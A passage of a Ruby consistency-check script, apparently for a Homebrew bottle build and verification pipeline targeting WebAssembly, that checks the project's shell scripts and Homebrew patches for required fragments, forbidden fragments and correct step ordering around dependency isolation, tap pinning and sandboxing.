    'BUILD_TEST_DEPENDENCY_LIST="$CONTROL_DIR/same-tap-build-test-dependencies.txt"',
    'DEPENDENCY_POUR_LIST="$CONTROL_DIR/target-pour-dependencies.txt"',
    'ALLOWED_TARGET_TAPS="$CONTROL_DIR/allowed-target-taps.txt"',
    'STATIC_RUNTIME_DEPENDENCIES="$CONTROL_DIR/static-runtime-dependencies.txt"',
    'log="$CONTROL_DIR/brew-install-attempt-${attempt}.log"',
    'rm -rf "$CONTROL_DIR"',
    'unset HOMEBREW_KANDELO_BOTTLE_TAG KANDELO_HOMEBREW_BOTTLE_TAG',
    'unset HOMEBREW_KANDELO_GNU_TAR',
    'HOMEBREW_KANDELO_GNU_TAR="$(command -v tar || true)"',
    'GNU_TAR_VERSION="$("$HOMEBREW_KANDELO_GNU_TAR" --version 2>/dev/null || true)"',
    '^/nix/store/[0-9a-z]{32}-gnutar-[^/]+/bin/tar$',
    'dev shell does not provide a protected Nix GNU tar',
    'export HOMEBREW_KANDELO_GNU_TAR',
    'run_brew_for_kandelo_bottles()',
    'HOMEBREW_KANDELO_BOTTLE_TAG="$BOTTLE_TAG"',
    'KANDELO_HOMEBREW_BOTTLE_TAG="$BOTTLE_TAG"',
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install',
    "--include-build --include-test",
    'jq -r \'.build_and_test[]\' "$HOST_DEPENDENCY_PLAN" >"$HOST_DEPENDENCY_LIST"',
    'keys == ["build", "build_and_test", "formula", "full_name", "runtime_and_test", "schema", "tap", "target_taps"]',
    '.schema == 3',
    '--slurpfile resolved "$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"',
    'map({tap_name, tap_repository, tap_commit}) | sort_by(.tap_name)',
    'DEPENDENCY_TAP_ROOTS=()',
    '"$BREW_BIN" tap "$dependency_tap" "$dependency_root"',
    'DEPENDENCY_TAP_ROOTS+=("$dependency_root")',
    '"${DEPENDENCY_TAP_ROOTS[@]}"',
    'filter_target_dependencies()',
    'Homebrew runtime dependency graph differs from the static locked-tap graph',
    'validate_dependency_list "$HOST_DEPENDENCY_LIST" "host dependency list"',
    'validate_dependency_list "$DEPENDENCY_LIST"',
    '"$BUILD_TEST_DEPENDENCY_LIST" "build/test dependency list"',
    'validate_dependency_list "$DEPENDENCY_POUR_LIST"',
    'done <"$DEPENDENCY_POUR_LIST"',
    '"$BREW_BIN" list --formula "$dependency" >/dev/null',
    'target Homebrew rejected the native Formula proxy keg',
    '--expected-dependencies "$DEPENDENCY_LIST"',
    '"$BREW_BIN" install --build-bottle --ignore-dependencies',
    'homebrew_patched_launcher_snapshot_target_cellar_layout',
    'Formula test or bottle creation changed the planned target Cellar',
    'run_brew_for_kandelo_bottles "$BREW_BIN" bottle',
    '--bottle-identity-json',
    'Homebrew bottle rebuild $BOTTLE_REBUILD differs from planned Formula rebuild $EXPECTED_BOTTLE_REBUILD',
    'cp -p "$BOTTLE_SOURCE_JSON" "$OUT_DIR/bottles/"',
    'cp -p "${bottle_archives[0]}" "$OUT_DIR/bottles/"',
    "printf 'NATIVE_BUILD_ROOT=%q\\n' \"$NATIVE_BUILD_ROOT\"",
  ].each do |fragment|
    check(bottle_builder.include?(fragment), "reviewed bottle builder lacks #{fragment}")
  end
  retained_receipt_bottle_command = <<~'SHELL'.chomp
    run_brew_for_kandelo_bottles "$BREW_BIN" bottle \
        --json --keep-old --root-url "$BOTTLE_ROOT_URL" "$FORMULA_REF"
  SHELL
  check(bottle_builder.include?(retained_receipt_bottle_command) &&
        !bottle_builder.include?("--no-rebuild") &&
        !bottle_builder.match?(/bottle \\\n\s+--only-json-tab/),
        "reviewed bottle builder no longer retains its embedded installation receipt")
  host_plan_index = bottle_builder.index("--host-dependencies-json")
  native_install_index = bottle_builder.index(
    "run_native_brew_logged install --as-dependency --formula"
  )
  native_info_index = bottle_builder.index(
    "homebrew_patched_launcher_run_native info --json=v2"
  )
  native_missing_index = bottle_builder.index("run_native_brew_logged missing")
  runtime_dependency_index = bottle_builder.index(
    'deps --topological --full-name --formula "$FORMULA_REF"'
  )
  build_test_dependency_index = bottle_builder.index(
    'deps --topological --full-name --include-build --include-test'
  )
  native_seal_index = bottle_builder.index("homebrew_patched_launcher_seal_native_prefix")
  native_bridge_index = bottle_builder.index("homebrew_patched_launcher_bridge_native_formula")
  native_proxy_index = bottle_builder.index(
    '"$BREW_BIN" list --formula "$dependency"'
  )
  dependency_pour_index = bottle_builder.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install'
  )
  target_build_index = bottle_builder.index("  brew_install_build_bottle")
  check(host_plan_index && native_install_index && native_info_index &&
        native_missing_index && runtime_dependency_index && build_test_dependency_index &&
        native_seal_index && native_bridge_index && native_proxy_index &&
        dependency_pour_index &&
        target_build_index &&
        host_plan_index < native_install_index &&
        native_install_index < native_info_index &&
        native_info_index < native_missing_index &&
        native_missing_index < runtime_dependency_index &&
        runtime_dependency_index < build_test_dependency_index &&
        build_test_dependency_index < native_seal_index &&
        native_seal_index < native_bridge_index &&
        native_bridge_index < native_proxy_index &&
        native_proxy_index < dependency_pour_index &&
        dependency_pour_index < target_build_index,
        "reviewed bottle builder mixes native and target dependency phases")
  check(!bottle_builder.include?("--only-dependencies"),
        "reviewed bottle builder lets target Homebrew resolve dependencies recursively")
  check(bottle_builder.include?("--force-bottle \\\n    --as-dependency \\\n    --ignore-dependencies") &&
        bottle_builder.include?(
          '"$BREW_BIN" install --build-bottle --ignore-dependencies'
        ), "reviewed bottle builder permits target dependency recursion")
  bottle_verifier = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-verify-poured-bottle.sh")
  )
  [
    '--sysroot-build-root) SYSROOT_BUILD_ROOT=',
    'SYSROOT_BUILD_ROOT OUT; do',
    'sysroot build root must be a real directory',
    'SYSROOT_BUILD_ROOT="$(cd "$SYSROOT_BUILD_ROOT" && pwd -P)"',
    '"$WORK_DIR" "$KANDELO_ROOT" "$TAP_ROOT" "$OUT_PARENT" "$SYSROOT_BUILD_ROOT"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier protected sysroot contract lacks #{fragment}")
  end
  check(!bottle_verifier.include?('SYSROOT_BUILD_ROOT="${KANDELO_ROOT') &&
        !bottle_verifier.include?('SYSROOT_BUILD_ROOT="$KANDELO_ROOT"'),
        "reviewed bottle verifier falls back to the pristine source checkout for its sysroot")
  publisher_isolation_patch_path =
    "homebrew/patches/0002-support-isolated-publisher.patch"
  publisher_isolation_patch = File.read(File.join(REPO_ROOT, publisher_isolation_patch_path))
  platform_patch = File.read(
    File.join(REPO_ROOT, "homebrew/patches/0001-add-kandelo-wasm-bottle-tags.patch")
  )
  [bottle_builder, bottle_verifier].each do |formula_runner|
    check(formula_runner.include?(
      "PUBLISHER_ISOLATION_PATCH_FILE=\"$KANDELO_ROOT/#{publisher_isolation_patch_path}\""
    ) &&
          formula_runner.include?(
            '"$BREW_BIN" "$PATCH_FILE" "$WORK_DIR" "$PUBLISHER_ISOLATION_PATCH_FILE"'
          ), "Formula runner does not apply the publisher-only isolation patch")
    check(formula_runner.include?('"$BREW_BIN" trust --tap "$TAP_NAME"'),
          "Formula runner does not trust the reviewed tap")
    check(!formula_runner.include?("trust --formula") &&
          !formula_runner.include?("homebrew_seed_reviewed_tap_trust"),
          "Formula runner persists redundant item trust")
    seed_index = formula_runner.index(
      "homebrew_patched_launcher_seed_bundler_groups bottle formula_test"
    )
    isolate_index = formula_runner.index("homebrew_patched_launcher_isolate")
    check(seed_index && isolate_index && seed_index < isolate_index,
          "Formula runner does not seed locked Bundler groups before isolation")
    [
      '.dependencies[] | [.tap_name, .root, .tap_commit] | @tsv',
      '"$BREW_BIN" tap "$dependency_tap" "$dependency_root"',
      'tapped_dependency_root="$("$BREW_BIN" --repository "$dependency_tap")"',
      'locked_dependency_root="$(cd "$dependency_root" && pwd -P)"',
      '[ "$tapped_dependency_root" != "$locked_dependency_root" ]',
      '[ "$(git -C "$tapped_dependency_root" rev-parse HEAD)" = "$dependency_commit" ]',
      '[ -z "$(git -C "$tapped_dependency_root" status --short --untracked-files=all)" ]',
    ].each do |fragment|
      check(formula_runner.include?(fragment),
            "Formula runner immutable dependency tap binding lacks #{fragment}")
    end
    [
      'NATIVE_PREFIX="$(homebrew_patched_launcher_native_prefix_path "$NATIVE_BASE")"',
      'NATIVE_CACHE="$NATIVE_BASE/c"',
      'NATIVE_TEMP="$NATIVE_BASE/t"',
      'NATIVE_CONFIG="$NATIVE_BASE/g"',
      'NATIVE_HOME="$NATIVE_BASE/h"',
      'unset HOMEBREW_RELOCATE_BUILD_PREFIX',
      "homebrew_patched_launcher_prepare_native_prefix",
      'NATIVE_INSTALL_LOG="$CONTROL_DIR/',
      'HOST_DEPENDENCY_PLAN="$CONTROL_DIR/host-dependencies.json"',
      'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
      'EXPECTED_PLAN_TAP="$TAP_NAME"',
      '"$TAP_ROOT" "$TAP_NAME" "$FORMULA" --host-dependencies-json',
      'immutable resolved tap map is required',
      '--slurpfile resolved "$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"',
      'map({tap_name, tap_repository, tap_commit}) | sort_by(.tap_name)',
      '"homebrew/core/$dependency"',
      "run_native_brew_logged install --as-dependency --formula",
      'homebrew_patched_launcher_run_native info --json=v2',
      '.formulae[0].name == $name',
      '.formulae[0].full_name == $name',
      '.formulae[0].tap == "homebrew/core"',
      '(.formulae[0].installed | type == "array" and length > 0)',
      "run_native_brew_logged missing",
      "homebrew_patched_launcher_seal_native_prefix",
      'homebrew_patched_launcher_bridge_native_formula "$dependency"',
      '"$BREW_BIN" list --formula "$dependency" >/dev/null',
      'homebrew_patched_launcher_run_native "$@" 2>&1 | tee -a "$NATIVE_INSTALL_LOG"',
      '>"$native_info" 2>>"$NATIVE_INSTALL_LOG"',
      '--install-log "$INSTALL_LOG"',
      'cleanup_and_exit() {',
      'trap \'cleanup_and_exit $?\' EXIT',
      'if homebrew_patched_launcher_cleanup; then',
      'preserving temporary Homebrew realms after cleanup failure',
      '[ "$original_status" -eq 0 ] || return "$original_status"',
      'exit "$cleanup_status"',
    ].each do |fragment|
      check(formula_runner.include?(fragment),
            "Formula runner native/target realm contract lacks #{fragment}")
    end
    sequential_native_install = <<~'SHELL'.chomp
      for dependency in "${native_dependencies[@]}"; do
        run_native_brew_logged install --as-dependency --formula \
          "homebrew/core/$dependency"
      done
    SHELL
    check(formula_runner.include?(sequential_native_install) &&
          !formula_runner.include?("native_formula_refs"),
          "Formula runner combines native tools under conflicting top-level locks")
    check(formula_runner.scan(/>\s*"\$HOST_DEPENDENCY_LIST"/).length == 2,
          "Formula runner has more than one authority for its native dependency plan")
    check(!formula_runner.include?(
            "run_native_brew_logged install --as-dependency --ignore-dependencies"
          ), "Formula runner suppresses native Homebrew's transitive dependency closure")
    check(!formula_runner.include?(
            '"$TAP_ROOT" "$TAP_REPOSITORY" "$FORMULA" --host-dependencies-json'
          ), "Formula runner conflates a third-party repository with its canonical tap name")
    check(!formula_runner.include?('--install-log "$NATIVE_INSTALL_LOG"'),
          "Formula runner includes native Homebrew output in target provenance")
    check(!formula_runner.match?(/run_brew_logged[^\n]*homebrew\/core/),
          "Formula runner installs native core Formulae in the target realm")
    check(formula_runner.scan('chmod 0711 "$NATIVE_BASE"').length == 1 &&
          formula_runner.include?("if [ -n \"\$BUILD_USER\" ]; then\n" \
                                  "  chmod 0711 \"\$NATIVE_BASE\"\nfi"),
          "Formula runner exposes its native parent outside isolated CI")
    check(formula_runner.scan('NATIVE_BASE="$(mktemp -d /tmp/k.XXXXXX)"').length == 1,
          "Formula runner does not use exactly one bounded native prefix")
  end
  check(bottle_builder.include?('rm -rf "$NATIVE_BASE" "$WORK_DIR"'),
        "reviewed bottle builder does not remove its temporary realms")
  protected_bottle_stage_index = bottle_verifier.index(
    'homebrew_patched_launcher_stage_protected_input'
  )
  local_bottle_pour_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" install --force-bottle --ignore-dependencies "$BOTTLE"'
  )
  [
    'if [ "$SELECTION_MODE" = "local-dry-run" ]; then',
    'homebrew_patched_launcher_stage_protected_input',
    '"$BUILD_USER" "$SHARED_TEMP" "$BOTTLE" "$EXPECTED_BOTTLE_FILENAME"',
    'PROTECTED_BOTTLE="$HOMEBREW_PATCHED_STAGED_INPUT_PATH"',
    'sha256sum "$PROTECTED_BOTTLE"',
    'wc -c <"$PROTECTED_BOTTLE"',
    'BOTTLE="$PROTECTED_BOTTLE"',
    '"$KANDELO_HOMEBREW_SUDO_BIN" -n -- /usr/bin/rm -rf --',
    'realm_cleanup_status="$?"',
    'could not remove temporary Homebrew realms',
    '[ "$launcher_status" -eq 0 ] || return "$launcher_status"',
    'return "$realm_cleanup_status"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier protected input contract lacks #{fragment}")
  end
  verifier_isolate_index = bottle_verifier.index(
    'homebrew_patched_launcher_isolate "$BUILD_USER"'
  )
  check(verifier_isolate_index && protected_bottle_stage_index &&
        local_bottle_pour_index &&
        verifier_isolate_index < protected_bottle_stage_index &&
        protected_bottle_stage_index < local_bottle_pour_index,
        "reviewed bottle verifier does not protect the selected archive before the isolated pour")
  [
    'TARGET_OPT_PREFIX="$("$BREW_BIN" --prefix "$FORMULA_REF")"',
    'EXPECTED_TARGET_OPT_PREFIX="$HOMEBREW_PATCHED_PREFIX/opt/$FORMULA"',
    '[ "$TARGET_OPT_PREFIX" = "$EXPECTED_TARGET_OPT_PREFIX" ]',
    'target Formula opt prefix is not canonical',
    'TARGET_PREFIX="$(cd "$TARGET_OPT_PREFIX" && pwd -P)"',
    'target Formula opt prefix does not resolve',
    'TARGET_RACK="$HOMEBREW_PATCHED_PREFIX/Cellar/$FORMULA"',
    '[ -d "$TARGET_RACK" ] && [ ! -L "$TARGET_RACK" ]',
    'target Formula Cellar rack is not a real directory',
    'TARGET_RACK="$(cd "$TARGET_RACK" && pwd -P)"',
    'target Formula Cellar rack does not resolve',
    'EXPECTED_TARGET_PREFIX="$TARGET_RACK/$PKG_VERSION"',
    '[ -d "$EXPECTED_TARGET_PREFIX" ] && [ ! -L "$EXPECTED_TARGET_PREFIX" ]',
    'expected target Formula keg is not a real directory',
    'EXPECTED_TARGET_PREFIX="$(cd "$EXPECTED_TARGET_PREFIX" && pwd -P)"',
    'expected target Formula keg does not resolve',
    '[ "$TARGET_PREFIX" = "$EXPECTED_TARGET_PREFIX" ]',
    'target Formula opt prefix does not select the exact versioned keg',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier target-keg contract lacks #{fragment}")
  end
  target_opt_index = bottle_verifier.index(
    'TARGET_OPT_PREFIX="$("$BREW_BIN" --prefix "$FORMULA_REF")"'
  )
  target_real_index = bottle_verifier.index(
    'TARGET_PREFIX="$(cd "$TARGET_OPT_PREFIX" && pwd -P)"'
  )
  exact_target_index = bottle_verifier.index(
    '[ "$TARGET_PREFIX" = "$EXPECTED_TARGET_PREFIX" ]'
  )
  target_test_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" test "$FORMULA_REF"'
  )
  runtime_evidence_index = bottle_verifier.index(
    'homebrew-bottle-runtime-evidence.py" capture'
  )
  check(local_bottle_pour_index && target_opt_index && target_real_index && exact_target_index &&
        target_test_index && runtime_evidence_index &&
        local_bottle_pour_index < target_opt_index &&
        target_opt_index < target_real_index && target_real_index < exact_target_index &&
        exact_target_index < target_test_index &&
        target_test_index < runtime_evidence_index,
        "reviewed bottle verifier does not select the exact installed keg before evidence capture")
  reconstructed_source_index = bottle_verifier.index(
    'mapfile -t source_tap_changes'
  )
  tap_clone_index = bottle_verifier.index(
    '"$BREW_BIN" tap "$TAP_NAME" "$TAP_ROOT"'
  )
  clean_clone_index = bottle_verifier.index(
    'git -C "$TAPPED_TAP_ROOT" rev-parse HEAD'
  )
  materialize_formula_index = bottle_verifier.index(
    'cp -- "$TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE"'
  )
  selected_formula_index = bottle_verifier.index(
    'mapfile -t selected_tap_changes'
  )
  check(
    bottle_verifier.include?(
      'RECONSTRUCTED_FORMULA_RELATIVE="Formula/$FORMULA.rb"'
    ) &&
      bottle_verifier.include?(
        'git -C "$TAP_ROOT" status --short --untracked-files=all'
      ) &&
      bottle_verifier.include?(
        '[ -f "$TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        '[ ! -L "$TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        '"${source_tap_changes[0]}" = " M $RECONSTRUCTED_FORMULA_RELATIVE"'
      ) &&
      bottle_verifier.include?('[ "$TAPPED_TAP_ROOT" != "$TAP_ROOT" ]') &&
      bottle_verifier.include?(
        '[ -f "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        '[ ! -L "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE" ]'
      ) &&
      bottle_verifier.include?(
        '"${selected_tap_changes[0]}" = " M $RECONSTRUCTED_FORMULA_RELATIVE"'
      ) &&
      bottle_verifier.include?(
        'cmp -s "$TAPPED_TAP_ROOT/$RECONSTRUCTED_FORMULA_RELATIVE"'
      ) &&
      !bottle_verifier.include?(' -ef "$TAP_ROOT/Formula/$FORMULA.rb"') &&
      reconstructed_source_index && tap_clone_index && clean_clone_index &&
      materialize_formula_index && selected_formula_index &&
      reconstructed_source_index < tap_clone_index &&
      tap_clone_index < clean_clone_index &&
      clean_clone_index < materialize_formula_index &&
      materialize_formula_index < selected_formula_index,
    "bottle verifier does not materialize only the reconstructed Formula into the planned Homebrew tap clone"
  )
  [
    "diff --git a/Library/Homebrew/build.rb b/Library/Homebrew/build.rb",
    "diff --git a/Library/Homebrew/dev-cmd/bottle.rb b/Library/Homebrew/dev-cmd/bottle.rb",
    'require "kandelo_publisher"',
    "diff --git a/Library/Homebrew/kandelo_publisher.rb b/Library/Homebrew/kandelo_publisher.rb",
    "module KandeloPublisher",
    "def self.active?",
    'GNU_TAR_PATH = ENV.fetch(GNU_TAR_ENV, "").dup.freeze',
    "def self.reproducible_gnu_tar",
    "publisher_gnu_tar = KandeloPublisher.reproducible_gnu_tar",
    "reproducible_gnutar_args(mtime)",
    "def self.prepare_archived_tab!(tab, expected_tap:, expected_tap_git_head:)",
    'source["tap"] == expected_tap',
    "tap_git_head == expected_tap_git_head",
    "archived_source = source.dup",
    'archived_source.delete("tap_git_head")',
    "tab.source = archived_source",
    "expected_tap:          tap.name",
    "expected_tap_git_head: tap_git_revision",
    "FileUtils.touch(bottle_path, mtime: tab_source_modified_time)",
    "def self.dependency_plan(formula = nil, require_match: true)",
    "def self.selected_tap_formula?(formula)",
    'tap.keys.sort == %w[tap_commit tap_name tap_repository]',
    'tap_repository == "#{owner}/homebrew-#{short_name}"',
    'TAP_GIT_HEAD.match?(tap["tap_commit"])',
    'target_names == target_names.sort.uniq',
    'tap.fetch("tap_name")',
    'PLAN_FILENAME = ".kandelo-publisher-build-dependencies.json"',
    "plan_path = HOMEBREW_PREFIX/PLAN_FILENAME",
    "plan = KandeloPublisher.dependency_plan(formula)",
    "@deps = publisher_build_dependencies if args.build_bottle?",
    "dependency.build? && !dependency.implicit?",
    "direct_native_build_dependencies.sort_by(&:name)",
    "diff --git a/Library/Homebrew/extend/os/linux/formula.rb b/Library/Homebrew/extend/os/linux/formula.rb",
    "return if KandeloPublisher.selected_tap_formula?(self)",
    "diff --git a/Library/Homebrew/extend/os/linux/sandbox.rb b/Library/Homebrew/extend/os/linux/sandbox.rb",
    "return if KandeloPublisher.active?",
    "diff --git a/Library/Homebrew/diagnostic.rb b/Library/Homebrew/diagnostic.rb",
    ".reject { |dir| dir == HOMEBREW_REPOSITORY }",
    "diff --git a/Library/Homebrew/trust.rb b/Library/Homebrew/trust.rb",
    "next if trusted_tap?(tap)",
    "explicit `brew trust` operations still use the normal mutation path",
    "applied only to the publisher's temporary Homebrew overlay",
  ].each do |fragment|
    check(publisher_isolation_patch.include?(fragment),
          "publisher-only isolation patch lacks #{fragment}")
  end
  check(!publisher_isolation_patch.include?('+    source.delete("tap_git_head")'),
        "publisher patch mutates the shallow-copied installed receipt source")
  publisher_patch_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publisher-overlay-patch.sh")
  )
  [
    '"--mtime=#{mtime}"',
    '"--sort=name"',
    '"--owner=0", "--group=0", "--numeric-owner"',
    '"--format=pax"',
    'globexthdr.name=/GlobalHead.%n,exthdr.name=%d/PaxHeaders/%f,delete=atime,delete=ctime',
    'ENV["HOMEBREW_KANDELO_GNU_TAR"] = "/tmp/formula-controlled-tar"',
    "successful bottle did not restore the exact installed receipt bytes",
    "failed bottle did not restore the exact installed receipt bytes",
    "publisher accepted mismatched archived receipt provenance",
    "ordinary Homebrew receipt behavior changed without a protected publisher plan",
    "recursive same-tap Formula retained native Linux global dependencies",
    "recursive locked-tap Formula retained native Linux global dependencies",
    "protected publisher plan changed Linux global dependencies for another tap",
    "protected publisher plan changed native Homebrew global dependencies",
    "mutable target tap revision suppressed Linux global dependencies",
    "mismatched target tap repository suppressed Linux global dependencies",
  ].each do |fragment|
    check(publisher_patch_test.include?(fragment),
          "publisher overlay regression test lacks #{fragment}")
  end
  check(!platform_patch.include?("dir == HOMEBREW_REPOSITORY"),
        "guest Homebrew platform patch skips repository writability")
  check(!platform_patch.include?("trusted_tap?(tap)"),
        "guest Homebrew platform patch includes publisher trust behavior")
  check(!platform_patch.include?("KandeloPublisher") &&
        !platform_patch.include?("add_global_deps_to_spec"),
        "guest Homebrew platform patch suppresses Linux global dependencies")
  check(!platform_patch.include?("HOMEBREW_KANDELO_GNU_TAR") &&
        !platform_patch.include?("reproducible_gnutar_args") &&
        !platform_patch.include?("prepare_archived_tab!"),
        "guest Homebrew platform patch includes publisher-only bottle normalization")
  [
    "diff --git a/Library/Homebrew/github_packages.rb b/Library/Homebrew/github_packages.rb",
    "# An explicit repository-rooted package path is not a generated tap name.",
    '"#{URL_PREFIX}#{org.downcase}/#{repo}"',
  ].each do |fragment|
    check(platform_patch.include?(fragment),
          "guest Homebrew platform patch lacks repository-root preservation: #{fragment}")
  end
  check(platform_patch.include?("-    root_url(org, repo)"),
        "guest Homebrew platform patch does not replace upstream GHCR root shortening")
  bootstrap_builder = File.read(File.join(REPO_ROOT, "scripts/build-homebrew-bootstrap.sh"))
  check(!bootstrap_builder.include?(publisher_isolation_patch_path),
        "guest Homebrew bootstrap applies the publisher-only isolation patch")
  [
    'NATIVE_BASE="$(mktemp -d /tmp/k.XXXXXX)"',
    'DEPENDENCY_LIST="$CONTROL_DIR/dependencies.txt"',
    'TEST_DEPENDENCY_LIST="$CONTROL_DIR/test-dependencies.txt"',
    'SAME_TAP_TEST_DEPENDENCY_LIST="$CONTROL_DIR/same-tap-test-dependencies.txt"',
    'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
    'HOST_DEPENDENCY_PLAN="$CONTROL_DIR/host-dependencies.json"',
    'NATIVE_INSTALL_LOG="$CONTROL_DIR/native-install.log"',
    'DEPENDENCY_POUR_LIST="$CONTROL_DIR/pour-dependencies.txt"',
    "--include-test",
    'validate_dependency_list "$DEPENDENCY_LIST"',
    '"$SAME_TAP_TEST_DEPENDENCY_LIST" "test dependency list"',
    'validate_dependency_list "$DEPENDENCY_POUR_LIST"',
    'validate_dependency_list "$HOST_DEPENDENCY_LIST"',
    'jq -r \'.runtime_and_test[]\' "$HOST_DEPENDENCY_PLAN" >"$HOST_DEPENDENCY_LIST"',
    'homebrew_patched_launcher_stage_dependency_plan "$HOST_DEPENDENCY_PLAN"',
    'done <"$DEPENDENCY_POUR_LIST"',
    'done <"$HOST_DEPENDENCY_LIST"',
    '"$BREW_BIN" list --formula "$dependency" >/dev/null',
    'target Homebrew rejected the native Formula proxy keg',
    'unset HOMEBREW_KANDELO_BOTTLE_TAG KANDELO_HOMEBREW_BOTTLE_TAG',
    '--expected-dependencies "$DEPENDENCY_LIST"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment), "reviewed bottle verifier lacks #{fragment}")
  end
  check(!bottle_verifier.include?("--only-dependencies"),
        "reviewed bottle verifier reintroduced the target's pure build closure")
  verifier_runtime_dependency_index = bottle_verifier.index(
    'deps --topological --full-name --formula "$FORMULA_REF"'
  )
  verifier_test_dependency_index = bottle_verifier.index(
    'deps --topological --full-name --include-test'
  )
  verifier_host_plan_index = bottle_verifier.index("--host-dependencies-json")
  verifier_plan_stage_index = bottle_verifier.index(
    'homebrew_patched_launcher_stage_dependency_plan "$HOST_DEPENDENCY_PLAN"'
  )
  verifier_native_install_index = bottle_verifier.index(
    "run_native_brew_logged install --as-dependency --formula"
  )
  verifier_native_info_index = bottle_verifier.index(
    "homebrew_patched_launcher_run_native info --json=v2"
  )
  verifier_native_missing_index = bottle_verifier.index("run_native_brew_logged missing")
  verifier_native_seal_index = bottle_verifier.index(
    "homebrew_patched_launcher_seal_native_prefix"
  )
  verifier_native_bridge_index = bottle_verifier.index(
    "homebrew_patched_launcher_bridge_native_formula"
  )
  verifier_native_proxy_index = bottle_verifier.index(
    '"$BREW_BIN" list --formula "$dependency"'
  )
  verifier_dependency_pour_index = bottle_verifier.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install'
  )
  verifier_cache_clear_index = bottle_verifier.index(
    'find "$HOMEBREW_CACHE" -mindepth 1 -delete'
  )
  verifier_target_install_index = bottle_verifier.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install',
    (verifier_dependency_pour_index || -1) + 1
  )
  verifier_formula_test_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" test "$FORMULA_REF"'
  )
  check(verifier_host_plan_index && verifier_plan_stage_index && verifier_native_install_index &&
        verifier_native_info_index && verifier_native_missing_index &&
        verifier_runtime_dependency_index && verifier_test_dependency_index &&
        verifier_native_seal_index && verifier_native_bridge_index &&
        verifier_native_proxy_index &&
        verifier_dependency_pour_index &&
        verifier_cache_clear_index && verifier_target_install_index &&
        verifier_formula_test_index &&
        verifier_host_plan_index < verifier_plan_stage_index &&
        verifier_plan_stage_index < verifier_native_install_index &&
        verifier_native_install_index < verifier_native_info_index &&
        verifier_native_info_index < verifier_native_missing_index &&
        verifier_native_missing_index < verifier_runtime_dependency_index &&
        verifier_runtime_dependency_index < verifier_test_dependency_index &&
        verifier_test_dependency_index < verifier_native_seal_index &&
        verifier_native_seal_index < verifier_native_bridge_index &&
        verifier_native_bridge_index < verifier_native_proxy_index &&
        verifier_native_proxy_index < verifier_dependency_pour_index &&
        verifier_dependency_pour_index < verifier_cache_clear_index &&
        verifier_cache_clear_index < verifier_target_install_index &&
        verifier_target_install_index < verifier_formula_test_index,
        "reviewed bottle verifier mixes native, target, or test phases")
  check(bottle_verifier.include?(
          '--force-bottle --as-dependency --ignore-dependencies --formula "$dependency"'
        ) && bottle_verifier.include?(
          '--force-bottle --ignore-dependencies --formula "$FORMULA_REF"'
        ) && bottle_verifier.include?(
          'install --force-bottle --ignore-dependencies "$BOTTLE"'
        ), "reviewed bottle verifier permits target dependency recursion")
  check(!bottle_builder.include?('$WORK_DIR/brew-install'),
        "reviewed bottle builder writes runner control logs through the Formula work directory")
  check(!bottle_builder.match?(/brew[^\n]*bottle[^\n]*(?:--merge|--write)/),
        "reviewed bottle builder lets Formula execution rewrite tap source")
  check(bottle_verifier.include?("homebrew_patched_launcher_snapshot_target_cellar_layout") &&
        bottle_verifier.include?("Formula test changed the planned target Cellar"),
        "reviewed bottle verifier does not reject implicit target Cellar changes")
  launcher = File.read(File.join(REPO_ROOT, "scripts/homebrew-patched-launcher.sh"))
  [
    "systemd-run", "--wait", "--collect", "--pipe",
    "homebrew_patched_launcher_snapshot_target_cellar_layout",
    "homebrew-patched-launcher: target Cellar is unavailable",
    "target Cellar rack is not a real directory",
    "target Cellar keg is not a real directory",
    'wasm32) sysroot="$sysroot_build_root/sysroot"',
    'wasm64) sysroot="$sysroot_build_root/sysroot64"',
    'sysroot build root must be a real directory',
    'sysroot must be a real directory containing a regular libc archive',
    'expected_sysroot=%q',
    'HOMEBREW_KANDELO_SYSROOT:-}',
    'WASM_POSIX_SYSROOT:-}',
    "--property=KillMode=control-group", "--property=SendSIGKILL=yes",
    "--property=NoNewPrivileges=yes", "--expand-environment=no",
    '"--property=BindReadOnlyPaths=$kandelo_root:$source_alias_dir/kandelo"',
    '"--property=BindReadOnlyPaths=$tap_root:$source_alias_dir/tap"',
    '"--property=BindReadOnlyPaths=$sysroot:$source_alias_dir/sysroot"',
    '"--property=InaccessiblePaths=$kandelo_root"',
    '"--property=InaccessiblePaths=$tap_root"',
    '"--property=InaccessiblePaths=$output_root"',
    '"--property=InaccessiblePaths=$sysroot_build_root"',
    '"--uid=$build_user"', '"--gid=$build_group"',
    'env_bin="$(command -v env)"',
    'printf \' --working-directory="$working_directory" -- %q -i\'',
    'printf \'bottle_tag_env=()\\n\'',
    'for variable in KANDELO_HOMEBREW_BOTTLE_TAG HOMEBREW_KANDELO_BOTTLE_TAG',
    'bottle_tag_env+=("%s=${%s}")',
    'HOMEBREW_KANDELO_ROOT=$source_alias_dir/kandelo',
    'KANDELO_HOMEBREW_KANDELO_ROOT=$source_alias_dir/kandelo',
    'HOMEBREW_KANDELO_SYSROOT=$source_alias_dir/sysroot',
    'WASM_POSIX_SYSROOT=$source_alias_dir/sysroot',
